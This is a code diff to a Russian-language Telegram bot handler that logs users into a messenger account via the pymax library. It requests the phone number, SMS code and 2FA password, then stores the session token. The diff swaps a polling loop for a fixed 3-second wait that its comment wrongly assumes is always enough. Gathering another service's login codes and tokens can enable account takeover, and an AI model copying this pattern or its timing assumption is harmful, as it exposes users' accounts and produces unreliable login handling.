@@ -127,58 +127,51 @@ async def phone_handler(message: types.Message, state: FSMContext):
             pending[uid]["user_id"] = client.my_id
             pending[uid]["status"] = "done"
             logging.info(f"Токен сохранён: {client.token[:20]}...")
-            await safe_edit(msg, "✅ SMS отправлена. Введи код из 6 цифр:")
         except Exception as e:
             error = str(e).lower()
             logging.error(f"Ошибка авторизации: {e}")
             if "block" in error:
-                await safe_edit(msg, "🚫 Аккаунт заблокирован или удалён.")
+                pending[uid]["status"] = "blocked"
             elif "flood" in error or "limit" in error:
-                await safe_edit(msg, "⏳ Слишком много попыток. Попробуйте позже.")
+                pending[uid]["status"] = "flood_sms"
             elif "password" in error or "2fa" in error:
                 pending[uid]["status"] = "need_password"
-                await safe_edit(msg, "🔐 Введи пароль 2FA:")
             elif "invalid" in error or "wrong" in error:
                 pending[uid]["status"] = "invalid_code"
-                await safe_edit(msg, "❌ Неверный код. Попробуй ещё раз.")
             else:
-                await safe_edit(msg, f"❌ {e}")
-            if uid in pending and pending[uid].get("status") != "need_password" and pending[uid].get("status") != "invalid_code":
-                del pending[uid]
-                await state.clear()
+                pending[uid]["status"] = f"error:{e}"
 
-    asyncio.create_task(auth_task())
+    # Запускаем задачу
+    task = asyncio.ensure_future(auth_task())
 
-    for i in range(150):
-        await asyncio.sleep(0.2)
-        
-        if uid not in pending:
-            return
-        
-        status = pending[uid].get("status", "")
+    # Ждём 3 секунды — за это время pymax точно получит ответ от сервера
+    await asyncio.sleep(3)
 
-        if status == "flood_sms":
-            await safe_edit(msg, "⏳ Слишком много попыток. Попробуйте позже.")
-            del pending[uid]
-            await state.clear()
-            return
+    # Проверяем статус
+    if uid not in pending:
+        return
 
-        elif status == "blocked":
-            await safe_edit(msg, "🚫 Аккаунт заблокирован или удалён.")
-            del pending[uid]
-            await state.clear()
-            return
+    status = pending[uid].get("status", "")
 
-        elif status and status.startswith("error:"):
-            await safe_edit(msg, f"❌ {status[6:]}")
-            del pending[uid]
-            await state.clear()
-            return
-        
-        elif status == "done":
-            await safe_edit(msg, "✅ SMS отправлена. Введи код из 6 цифр:")
-            return
+    if status == "flood_sms":
+        await safe_edit(msg, "⏳ Слишком много попыток. Попробуйте позже.")
+        del pending[uid]
+        await state.clear()
+        return
 
+    elif status == "blocked":
+        await safe_edit(msg, "🚫 Аккаунт заблокирован или удалён.")
+        del pending[uid]
+        await state.clear()
+        return
+
+    elif status and status.startswith("error:"):
+        await safe_edit(msg, f"❌ {status[6:]}")
+        del pending[uid]
+        await state.clear()
+        return
+
+    # Если статус не установлен — значит pymax ждёт код
     await safe_edit(msg, "✅ SMS отправлена. Введи код из 6 цифр:")
 
 @dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
